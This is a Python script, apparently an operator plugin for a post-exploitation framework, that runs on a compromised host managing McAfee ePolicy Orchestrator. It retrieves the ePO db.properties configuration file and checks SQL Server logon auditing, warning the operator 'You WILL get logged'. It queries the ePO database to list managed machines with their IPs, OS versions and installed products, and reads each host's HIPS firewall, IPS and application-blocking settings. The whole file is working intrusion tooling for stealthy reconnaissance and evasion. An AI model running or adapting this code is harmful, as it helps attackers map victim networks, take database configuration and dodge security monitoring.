
import dsz.ui, dsz.cmd, dsz.menu, dsz.lp
import sys
import ops.cmd
import re
import os
sys.path.append('D:\\DSZOPSDisk\\Resources\\Ops\\PyScripts\\database')
from database import sql_server

def __main__(arguments):
    global sql
    sql = ops.cmd.DszCommand('sql', dszquiet=False)
    sql.prefixes = ['log']
    sql.optdict['handle'] = None
    global ePOVersion
    ePOVersion = None
    global SQL_Nodes_List_ALL
    SQL_Nodes_List_ALL = None
    global SQL_Nodes_List_IP
    SQL_Nodes_List_IP = None
    global SQL_PolicyObjects_GUID
    SQL_PolicyObjects_GUID = None
    global SQL_PolicyObjectSettings_PolicyObjectID
    SQL_PolicyObjectSettings_PolicyObjectID = None
    global SQL_NodeInstalledProducts_GUID
    SQL_NodeInstalledProducts_GUID = None
    global SQL_SettingQuery_FeatureTexttID_CategoryTexttID_0_GUID
    SQL_SettingQuery_FeatureTexttID_CategoryTexttID_0_GUID = None
    global targetNode
    targetNode = None
    global policyObject
    policyObject = None
    global policyObjectSetting
    policyObjectSetting = None
    items = list()
    items.append({dsz.menu.Name: 'SQL Security Check', dsz.menu.Function: _sqlSecurityCheck, dsz.menu.Parameter: None, dsz.menu.Tags: ['sql', 'security', 'check']})
    items.append({dsz.menu.Name: 'Get DB Config File', dsz.menu.Function: _getDBConfig, dsz.menu.Parameter: None, dsz.menu.Tags: ['get', 'db', 'config']})
    items.append({dsz.menu.Name: 'Set SQL Handle', dsz.menu.Function: _setSqlHandle, dsz.menu.Parameter: None, dsz.menu.Tags: ['set', 'sql', 'handle']})
    items.append({dsz.menu.Name: 'Set ePO Version', dsz.menu.Function: _setePOVersion, dsz.menu.Parameter: None, dsz.menu.Tags: ['set', 'epo', 'version']})
    items.append({dsz.menu.Name: 'Set Target Node', dsz.menu.Function: _setTargetNode, dsz.menu.Parameter: None, dsz.menu.Tags: ['set', 'node']})
    items.append({dsz.menu.Name: 'Query Nodes', dsz.menu.Function: _nodesQuery, dsz.menu.Parameter: None, dsz.menu.Tags: ['query', 'nodes']})
    items.append({dsz.menu.Name: 'Query Node Installed Products', dsz.menu.Function: _queryNodesInstalledProducts, dsz.menu.Parameter: None, dsz.menu.Tags: ['query', 'nodes', 'installed', 'products']})
    items.append({dsz.menu.Name: 'Select PSP', dsz.menu.Function: _selectPSP, dsz.menu.Parameter: None, dsz.menu.Tags: ['select', 'psp']})
    items.append({dsz.menu.Name: 'Advanced Mode', dsz.menu.Function: _advancedMenu, dsz.menu.Parameter: None, dsz.menu.Tags: ['advanced', 'mode']})
    while True:
        _printConfiguration()
        (response, index) = dsz.menu.ExecuteSimpleMenu('-== McAfee ePolicy Orchestrator v1.0.0 ==-', items)
        if (index == (-1)):
            break

def _getDBConfig(input):
    q = ops.cmd.DszCommand('registryquery', hive='L', key='"software\\network associates\\ePolicy Orchestrator"', value='InstallFolder', dszquiet=True, wow32=True)
    r = q.execute()
    if (len(r.key[0].value) == 0):
        dsz.ui.Echo("Couldn't get the registry key... Bailing", dsz.ui.Echo)
        return
    conf = os.path.join(r.key[0].value[0].value, 'server', 'conf', 'orion', 'db.properties')
    q = ops.cmd.DszCommand(('get ' + conf))
    r = q.execute()
    if (len(r.filelocalname) == 0):
        dsz.ui.Echo("Couldn't get the conf file: {0}".format(conf), dsz.ERROR)
        return
    getfile = os.path.join(dsz.env.Get('_LOGPATH'), r.localgetdirectory.path, r.filelocalname[0].localname)
    ops.cmd.DszCommand('local run -command "cmd /c notepad.exe {0}"'.format(getfile)).execute()
    return

def _selectPSP(input):
    items = list()
    items.append({dsz.menu.Name: 'HIPS v7', dsz.menu.Function: _pspHIPSv7, dsz.menu.Parameter: None, dsz.menu.Tags: ['hips', 'v7']})
    (response, index) = dsz.menu.ExecuteSimpleMenu('-== Select PSP ==-', items)
    return

def _sqlSecurityCheck(arg):
    s = sql_server.SQLServer()
    s.audit_check()
    audit = sql_server.get_audit_level(s.instance_reg_loc)
    if ((audit.find('1') == 0) or (audit.find('3') == 0)):
        dsz.ui.Echo('System is auditing for successful logons! You WILL get logged.', dsz.ERROR)
    else:
        dsz.ui.Echo('Auditing looks good', dsz.GOOD)
    login = sql_server.get_login_mode(s.instance_reg_loc)
    if (login.find('0') == 0):
        dsz.ui.Echo('Login set to Standard Mode. You cannot login using SYSTEM.', dsz.WARNING)
    else:
        dsz.ui.Echo('Login not Standard mode. You should be able to login using SYSTEM (SQLServer 2005)', dsz.GOOD)
    res = dsz.ui.GetString('Continue? [y/N]', 'N')
    if ((res == 'y') or (res == 'Y')):
        return
    exit()

def _pspHIPSv7(input):
    items = list()
    items.append({dsz.menu.Name: 'Firewall Status', dsz.menu.Function: _pspSettingsQuery, dsz.menu.Parameter: ('HOSTIPS_7000_FW', 'FW_StatusMode'), dsz.menu.Tags: ['hips', 'v7', 'firewall', 'status']})
    items.append({dsz.menu.Name: 'IPS Status', dsz.menu.Function: _pspSettingsQuery, dsz.menu.Parameter: ('HOSTIPS_7000_IPS', 'IPS_StatusMode'), dsz.menu.Tags: ['hips', 'v7', 'IPS', 'status']})
    items.append({dsz.menu.Name: 'IPS Reaction Mode', dsz.menu.Function: _pspSettingsQuery, dsz.menu.Parameter: ('HOSTIPS_7000_IPS', 'IPS_Reaction'), dsz.menu.Tags: ['hips', 'v7', 'IPS', 'reaction']})
    items.append({dsz.menu.Name: 'App Blocking Status', dsz.menu.Function: _pspSettingsQuery, dsz.menu.Parameter: ('HOSTIPS_7000_APP', 'APP_StatusMode'), dsz.menu.Tags: ['hips', 'v7', 'app', 'status']})
    while True:
        _printConfiguration()
        (response, index) = dsz.menu.ExecuteSimpleMenu('-== HIPS v7 ==-', items)
        if (index == (-1)):
            break

def _pspSettingsQuery(input):
    global sql
    sql.optdict['action'] = 'query'
    if (targetNode == None):
        dsz.ui.Echo('[ERROR] You must select an AgentGUID', dsz.ERROR)
        return
    sql.optdict['querystring'] = SQL_SettingQuery_FeatureTexttID_CategoryTexttID_0_GUID.format(input[0], input[1], targetNode)
    sql.execute()
    return

def _printConfiguration(advanced=False):
    dsz.ui.Echo('Current Configuration:')
    if (sql.optdict['handle'] == None):
        color = dsz.ERROR
    else:
        color = dsz.GOOD
    dsz.ui.Echo('\t\tHandle:\t\t\t\t\t{0}'.format(sql.optdict['handle']), color)
    if (ePOVersion == None):
        color = dsz.ERROR
    else:
        color = dsz.GOOD
    dsz.ui.Echo('\t\tePO Version:\t\t\t{0}'.format(ePOVersion), color)
    dsz.ui.Echo('\t\tTarget Node:\t\t\t{0}'.format(targetNode))
    if (advanced == True):
        dsz.ui.Echo('\t\tPolicy Object:\t\t\t{0}'.format(policyObject))
        dsz.ui.Echo('\t\tPolicy Object Setting:\t{0}\n'.format(policyObjectSetting))
    else:
        dsz.ui.Echo('\n')
    return

def _setSqlHandle(input):
    global sql
    handle = dsz.ui.GetInt('Enter the SQL Handle Number')
    sql.optdict['handle'] = handle
    return

def _advancedMenu(input):
    items = list()
    items.append({dsz.menu.Name: 'Set SQL Handle', dsz.menu.Function: _setSqlHandle, dsz.menu.Parameter: None, dsz.menu.Tags: ['set', 'sql', 'handle']})
    items.append({dsz.menu.Name: 'Set ePO Version', dsz.menu.Function: _setePOVersion, dsz.menu.Parameter: None, dsz.menu.Tags: ['set', 'epo', 'version']})
    items.append({dsz.menu.Name: 'Set Target Node', dsz.menu.Function: _setTargetNode, dsz.menu.Parameter: None, dsz.menu.Tags: ['set', 'node']})
    items.append({dsz.menu.Name: 'Set Policy Object', dsz.menu.Function: _setPolicyObject, dsz.menu.Parameter: None, dsz.menu.Tags: ['set', 'policy', 'object']})
    items.append({dsz.menu.Name: 'Set Policy Object Setting', dsz.menu.Function: _setPolicyObjectSetting, dsz.menu.Parameter: None, dsz.menu.Tags: ['set', 'policy', 'object', 'setting']})
    items.append({dsz.menu.Name: 'Query Nodes', dsz.menu.Function: _nodesQuery, dsz.menu.Parameter: None, dsz.menu.Tags: ['query', 'nodes']})
    items.append({dsz.menu.Name: 'Query Node Installed Products', dsz.menu.Function: _queryNodesInstalledProducts, dsz.menu.Parameter: None, dsz.menu.Tags: ['query', 'nodes', 'installed', 'products']})
    items.append({dsz.menu.Name: 'Query Policy Objects', dsz.menu.Function: _queryPolicyObjects, dsz.menu.Parameter: None, dsz.menu.Tags: ['query', 'policy', 'objects']})
    items.append({dsz.menu.Name: 'Query Policy Object Settings', dsz.menu.Function: _queryPolicyObjectSettings, dsz.menu.Parameter: None, dsz.menu.Tags: ['query', 'policy', 'objects', 'settings']})
    items.append({dsz.menu.Name: 'Query Policy Object Setting Value', dsz.menu.Function: _queryPolicyObjectSettingValue, dsz.menu.Parameter: None, dsz.menu.Tags: ['query', 'policy', 'objects', 'settings', 'value']})
    while True:
        _printConfiguration(advanced=True)
        (response, index) = dsz.menu.ExecuteSimpleMenu('-== McAfee ePolicy Orchestrator v1.0.0 ==-', items)
        if (index == (-1)):
            break

def _setPolicyObject(input):
    global policyObject
    policyObject = dsz.ui.GetInt('Enter Policy Object ID')
    return

def _setPolicyObjectSetting(input):
    global policyObjectSetting
    policyObjectSetting = dsz.ui.GetInt('Enter Policy Object Setting ID')
    return

def _setePOVersion(input):
    items = list()
    items.append({dsz.menu.Name: '4.6', dsz.menu.Function: _setePOVersion46, dsz.menu.Parameter: None, dsz.menu.Tags: ['4.6']})
    items.append({dsz.menu.Name: '4.5', dsz.menu.Function: _setePOVersion45, dsz.menu.Parameter: None, dsz.menu.Tags: ['4.5']})
    (response, index) = dsz.menu.ExecuteSimpleMenu('-== Select ePO Version ==-', items)
    return

def _setTargetNode(input):
    global targetNode
    items = list()
    items.append('GUID')
    (selected, index) = dsz.menu.ExecuteSimpleMenu('-== Set Node By ==-', items)
    if (selected == 'GUID'):
        guid = dsz.ui.GetString('Enter GUID')
        if _isAgentGUID(guid):
            targetNode = guid
        else:
            dsz.ui.Echo('Please enter a valid GUID\n', dsz.ERROR)
    return

def _setePOVersion46(input):
    global ePOVersion
    ePOVersion = '4.6'
    global SQL_Nodes_List_ALL
    SQL_Nodes_List_ALL = '"SELECT ComputerName, DomainName, IPAddress, OSType, OSVersion, OSServicePackVer, AgentGUID, Products, LastUpdateGMT FROM (SELECT CAST(EPOComputerProperties.ComputerName AS varchar) AS ComputerName,CAST(EPOComputerProperties.DomainName AS varchar) AS DomainName,CAST(EPOComputerProperties.IPAddress AS varchar) AS IPAddress,CAST(EPOComputerProperties.OSType AS varchar) as OSType,CAST(EPOComputerProperties.OSVersion as varchar) AS OSVersion,CAST(EPOComputerProperties.OSServicePackVer as varchar) AS OSServicePackVer,EPOLeafNode.AgentGUID,CAST(EPOProductPropertyProducts.Products as varchar(200)) AS Products, EPOLeafNode.LastUpdate AS LastUpdateGMT, ROW_NUMBER() OVER (PARTITION BY EPOLeafNode.AgentGUID ORDER BY EPOLeafNode.LastUpdate) AS R FROM EPOComputerProperties LEFT JOIN EPOLeafNode ON EPOComputerProperties.ComputerName = EPOLeafNode.NodeName LEFT JOIN EPOProductPropertyProducts ON EPOProductPropertyProducts.ParentID = EPOLeafNode.AutoID) AS TBL WHERE R = 1 ORDER BY IPAddress"'
    global SQL_Nodes_List_IP
    SQL_Nodes_List_IP = '"SELECT CAST(EPOComputerProperties.ComputerName AS varchar) AS ComputerName,CAST(EPOComputerProperties.DomainName AS varchar) AS DomainName,CAST(EPOComputerProperties.IPAddress AS varchar) AS IPAddress,CAST(EPOComputerProperties.OSType AS varchar) as OSType,CAST(EPOComputerProperties.OSVersion as varchar) AS OSVersion,CAST(EPOComputerProperties.OSServicePackVer as varchar) AS OSServicePackVer,EPOLeafNode.AgentGUID,CAST(EPOProductPropertyProducts.Products as varchar(200)) AS Products, EPOLeafNode.LastUpdate AS LastUpdateGMT FROM EPOComputerProperties LEFT JOIN EPOLeafNode ON EPOComputerProperties.ComputerName = EPOLeafNode.NodeName LEFT JOIN EPOProductPropertyProducts ON EPOProductPropertyProducts.ParentID = EPOLeafNode.AutoID WHERE EPOComputerProperties.IPAddress = \'{0}\'"'
    global SQL_PolicyObjects_GUID
    SQL_PolicyObjects_GUID = '"SELECT PolicyObjectID,CAST(Name as varchar) as Name,CAST(FeatureTextID as varchar) as FeatureTexttID, CAST(CategoryTextID_0 as varchar) as CategoryTexttID_0 FROM EPOAssignedPolicy WHERE AgentGUID = \'{0}\'"'
    global SQL_PolicyObjectSettings_PolicyObjectID
    SQL_PolicyObjectSettings_PolicyObjectID = '"SELECT EPOPolicyObjectToSettings.PolicySettingsID,CAST(EPOPolicySettings.Name as varchar(200)) as Name FROM EPOPolicyObjectToSettings LEFT JOIN EPOPolicySettings ON EPOPolicyObjectToSettings.PolicySettingsID = EPOPolicySettings.PolicySettingsID WHERE PolicyObjectID = {0}"'
    global SQL_PolicyObjectSettingValue_PolicySettingsID
    SQL_PolicyObjectSettingValue_PolicySettingsID = '"SELECT CAST(SettingName as varchar) as SettingName,CAST(SettingValue as varchar(200)) as SettingValue FROM EPOPolicySettingValues WHERE PolicySettingsID = {0}"'
    global SQL_NodeInstalledProducts_GUID
    SQL_NodeInstalledProducts_GUID = '"SELECT CAST(EPOProductFamilies.FamilyDispName as varchar) AS FamilyDispName, CAST(EPOProductProperties.ProductVersion as varchar) AS ProductVersion FROM EPOProductProperties LEFT JOIN EPOLeafNode on EPOProductProperties.ParentID = EPOLeafNode.AutoID LEFT JOIN EPOProductFamilies on EPOProductFamilies.ProductCode = EPOProductProperties.ProductCode WHERE EPOLeafNode.AgentGUID = \'{0}\'"'
    global SQL_SettingQuery_FeatureTexttID_CategoryTexttID_0_GUID
    SQL_SettingQuery_FeatureTexttID_CategoryTexttID_0_GUID = '"SELECT CAST(SettingName as varchar) AS SettingName,CAST(SettingValue as varchar) AS SettingValue FROM (SELECT PolicySettingsID FROM (SELECT PolicyObjectID FROM EPOAssignedPolicy WHERE FeatureTextID = \'{0}\' AND CategoryTextID_0 = \'{1}\' AND AgentGUID = \'{2}\') AS EPOAssignedPolicy INNER JOIN EPOPolicyObjectToSettings ON EPOAssignedPolicy.PolicyObjectID = EPOPolicyObjectToSettings.PolicyObjectID) AS EPOPolicyObjectToSettings INNER JOIN EPOPolicySettingValues ON EPOPolicyObjectToSettings.PolicySettingsID = EPOPolicySettingValues.PolicySettingsID"'
    return

def _setePOVersion45(input):
    global ePOVersion
    ePOVersion = '4.5'
    global SQL_Nodes_List_ALL
    SQL_Nodes_List_ALL = '"SELECT ComputerName, DomainName, IPAddress, OSType, OSVersion, OSServicePackVer, AgentGUID, LastUpdateGMT FROM (SELECT CAST(EPOComputerProperties.ComputerName AS varchar) AS ComputerName,CAST(EPOComputerProperties.DomainName AS varchar) AS DomainName,CAST(EPOComputerProperties.IPAddress AS varchar) AS IPAddress,CAST(EPOComputerProperties.OSType AS varchar) as OSType,CAST(EPOComputerProperties.OSVersion as varchar) AS OSVersion,CAST(EPOComputerProperties.OSServicePackVer as varchar) AS OSServicePackVer,EPOLeafNode.AgentGUID, EPOLeafNode.LastUpdate AS LastUpdateGMT, ROW_NUMBER() OVER (PARTITION BY EPOLeafNode.AgentGUID ORDER BY EPOLeafNode.LastUpdate) AS R FROM EPOComputerProperties LEFT JOIN EPOLeafNode ON EPOComputerProperties.ComputerName = EPOLeafNode.NodeName) AS TBL WHERE R = 1 ORDER BY IPAddress"'
    global SQL_Nodes_List_IP
    SQL_Nodes_List_IP = '"SELECT CAST(EPOComputerProperties.ComputerName AS varchar) AS ComputerName,CAST(EPOComputerProperties.DomainName AS varchar) AS DomainName,CAST(EPOComputerProperties.IPAddress AS varchar) AS IPAddress,CAST(EPOComputerProperties.OSType AS varchar) as OSType,CAST(EPOComputerProperties.OSVersion as varchar) AS OSVersion,CAST(EPOComputerProperties.OSServicePackVer as varchar) AS OSServicePackVer,EPOLeafNode.AgentGUID, EPOLeafNode.LastUpdate AS LastUpdateGMT FROM EPOComputerProperties LEFT JOIN EPOLeafNode ON EPOComputerProperties.ComputerName = EPOLeafNode.NodeName WHERE EPOComputerProperties.IPAddress = \'{0}\'"'
    global SQL_PolicyObjects_GUID
    SQL_PolicyObjects_GUID = '"SELECT PolicyObjectID,CAST(Name as varchar) as Name,CAST(FeatureTextID as varchar) as FeatureTexttID, CAST(CategoryTextID_0 as varchar) as CategoryTexttID_0 FROM EPOAssignedPolicy WHERE AgentGUID = \'{0}\'"'
    global SQL_PolicyObjectSettings_PolicyObjectID
    SQL_PolicyObjectSettings_PolicyObjectID = '"SELECT EPOPolicyObjectToSettings.PolicySettingsID,CAST(EPOPolicySettings.Name as varchar(200)) as Name FROM EPOPolicyObjectToSettings LEFT JOIN EPOPolicySettings ON EPOPolicyObjectToSettings.PolicySettingsID = EPOPolicySettings.PolicySettingsID WHERE PolicyObjectID = {0}"'
    global SQL_PolicyObjectSettingValue_PolicySettingsID
    SQL_PolicyObjectSettingValue_PolicySettingsID = '"SELECT CAST(SettingName as varchar) as SettingName,CAST(SettingValue as varchar(200)) as SettingValue FROM EPOPolicySettingValues WHERE PolicySettingsID = {0}"'
    global SQL_NodeInstalledProducts_GUID
    SQL_NodeInstalledProducts_GUID = '"SELECT CAST(EPOProductFamilies.FamilyDispName as varchar) AS FamilyDispName, CAST(EPOProductProperties.ProductVersion as varchar) AS ProductVersion FROM EPOProductProperties LEFT JOIN EPOLeafNode on EPOProductProperties.ParentID = EPOLeafNode.AutoID LEFT JOIN EPOProductFamilies on EPOProductFamilies.ProductCode = EPOProductProperties.ProductCode WHERE EPOLeafNode.AgentGUID = \'{0}\'"'
    global SQL_SettingQuery_FeatureTexttID_CategoryTexttID_0_GUID
    SQL_SettingQuery_FeatureTexttID_CategoryTexttID_0_GUID = '"SELECT CAST(SettingName as varchar) AS SettingName,CAST(SettingValue as varchar) AS SettingValue FROM (SELECT PolicySettingsID FROM (SELECT PolicyObjectID FROM EPOAssignedPolicy WHERE FeatureTextID = \'{0}\' AND CategoryTextID_0 = \'{1}\' AND AgentGUID = \'{2}\') AS EPOAssignedPolicy INNER JOIN EPOPolicyObjectToSettings ON EPOAssignedPolicy.PolicyObjectID = EPOPolicyObjectToSettings.PolicyObjectID) AS EPOPolicyObjectToSettings INNER JOIN EPOPolicySettingValues ON EPOPolicyObjectToSettings.PolicySettingsID = EPOPolicySettingValues.PolicySettingsID"'
    return

def _nodesQuery(input):
    global sql
    sql.optdict['action'] = 'query'
    items = list()
    items.append('All Nodes')
    items.append('By IP')
    (selected, index) = dsz.menu.ExecuteSimpleMenu('-== Nodes Query ==-', items)
    if (selected == 'All Nodes'):
        sql.prefixes.insert(0, 'background')
        sql.optdict['querystring'] = SQL_Nodes_List_ALL
        sql.execute()
        sql.prefixes.remove('background')
    if (selected == 'By IP'):
        ip = dsz.ui.GetString('Enter IP')
        if _isIP(ip):
            sql.optdict['querystring'] = SQL_Nodes_List_IP.format(ip)
            sql.execute()
        else:
            print 'Please enter a valid IP'
    return

def _queryNodesInstalledProducts(input):
    global sql
    sql.optdict['action'] = 'query'
    if (targetNode == None):
        dsz.ui.Echo('[ERROR] You must select an AgentGUID', dsz.ERROR)
        return
    sql.optdict['querystring'] = SQL_NodeInstalledProducts_GUID.format(targetNode)
    sql.execute()
    return

def _queryPolicyObjects(input):
    global sql
    sql.optdict['action'] = 'query'
    if (targetNode == None):
        print '[Error] You must use an AgentGUID when looking up assigned policies'
        return
    sql.optdict['querystring'] = SQL_PolicyObjects_GUID.format(targetNode)
    sql.execute()
    return

def _queryPolicyObjectSettings(input):
    global sql
    sql.optdict['action'] = 'query'
    sql.optdict['querystring'] = SQL_PolicyObjectSettings_PolicyObjectID.format(policyObject)
    sql.execute()
    return

def _queryPolicyObjectSettingValue(input):
    global sql
    sql.optdict['action'] = 'query'
    sql.optdict['querystring'] = SQL_PolicyObjectSettingValue_PolicySettingsID.format(policyObjectSetting)
    sql.execute()
    return

def _isAgentGUID(str):
    p = re.compile('^[0-F]{8}-[0-F]{4}-[0-F]{4}-[0-F]{4}-[0-F]{12}$')
    if p.match(str):
        return True
    return False

def _isIP(str):
    p = re.compile('^[0-9]+\\.[0-9]+\\.[0-9]+\\.[0-9]+$')
    if p.match(str):
        return True
    return False
if (__name__ == '__main__'):
    try:
        __main__(sys.argv[1:])
    except RuntimeError as e:
        print ('\nCaught RuntimeError: %s' % e)